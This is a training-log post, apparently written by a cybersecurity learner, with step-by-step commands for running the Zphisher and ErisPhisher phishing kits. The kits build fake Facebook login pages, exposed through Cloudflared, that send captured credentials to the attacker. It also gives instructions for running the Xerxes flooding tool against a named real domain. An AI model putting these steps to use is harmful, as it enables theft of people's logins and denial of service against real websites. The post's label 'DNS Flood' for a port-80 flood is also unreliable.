### üíª What I Did:

On Day 4, I explored how to carry out realistic phishing simulations using *Zphisher* and *ErisPhisher. I also studied DNS concepts and executed a DNS flooding attack using the tool **Xerxes*. Additionally, I explored various platforms used to detect and investigate phishing websites. Finally, I researched some popular cybersecurity certifications.


## üß∞ Tools Used to create Fake Login page

* üîó **Zphisher**: [https://github.com/htr-tech/zphisher.git](https://github.com/htr-tech/zphisher.git)
* üîó **ErisPhisher**: [https://github.com/tanv1r-0x/ErisPhisher](https://github.com/tanv1r-0x/ErisPhisher)

## ‚öôÔ∏è Steps Followed

### üì• 1. Cloning the Repositories

```bash
git clone https://github.com/htr-tech/zphisher.git
git clone https://github.com/tanv1r-0x/ErisPhisher
```

### üìÅ 2. Navigating to Directory

```bash
cd zphisher
# or for ErisPhisher
cd ErisPhisher
```

### üîê 3. Gaining Root Access (Optional)

```bash
sudo su
```

### üßæ 4. Giving Execution Permission and Running the Script

```bash
chmod +x zphisher.sh
./zphisher.sh
```

### üéØ 5. Selecting Target Platform

When the tool starts, it shows a list of platforms to create fake login pages:

```
[01] Facebook
[02] Instagram
[03] Google
...
```

‚úÖ Choose:

```
1 for Facebook
```

### üñºÔ∏è 6. Selecting Login Page Style

```
[01] Traditional Login Page
[02] Advanced Voting Poll Login Page
[03] Fake Security Login Page
[04] Facebook Messenger Login Page
```

‚úÖ Choose:

```
1 for Traditional Login Page
```

### üåê 7. Choosing Port Forwarding Method

```
[01] Localhost
[02] Cloudflared  [Auto Detects]
[03] LocalXpose   [NEW! Max Min]
```

‚úÖ Choose:

```
02 for Cloudflared
```

### ‚ùì 8. Additional Prompts

* ‚öôÔ∏è **Custom Port?** ‚Üí `n`
* ‚öôÔ∏è **Mask URL?** ‚Üí `n`

### üîó 9. Final Output

üìå The tool will generate a phishing URL.

* Copy the link and open it in a browser.
* Any credentials entered will appear in the attacker's terminal.

### üåê What is DNS?

*DNS (Domain Name System)* is like the phonebook of the internet. When you type a website like google.com into your browser, DNS translates that human-readable name into an IP address (e.g., 142.250.77.238) so your computer can load the website.

* It maps domain names to IP addresses
* Without DNS, we would have to remember IP addresses of websites
* It uses a hierarchical structure with root, top-level domains (.com, .org), and domain levels

---

### üö® DNS Attack using Xerxes:

In this task, I simulated a *DNS Flood attack* using a tool named *Xerxes*. The attack overwhelms the server with requests, potentially making it unreachable.

#### ‚öô Steps Performed:

1. *Cloned Xerxes tool*:

bash
git clone https://github.com/jaspreet-infosec/XERXES


2. *Navigated to the folder and switched to root*:

bash
cd XERXES
sudo su
ls


3. *Compiled and ran the attack*:

bash
./xerxes website-name port
# Example:
./xerxes gndec.ac.in 80


‚û° This initiates a DNS Flood attack on the target, overwhelming its resources and possibly causing denial of service.
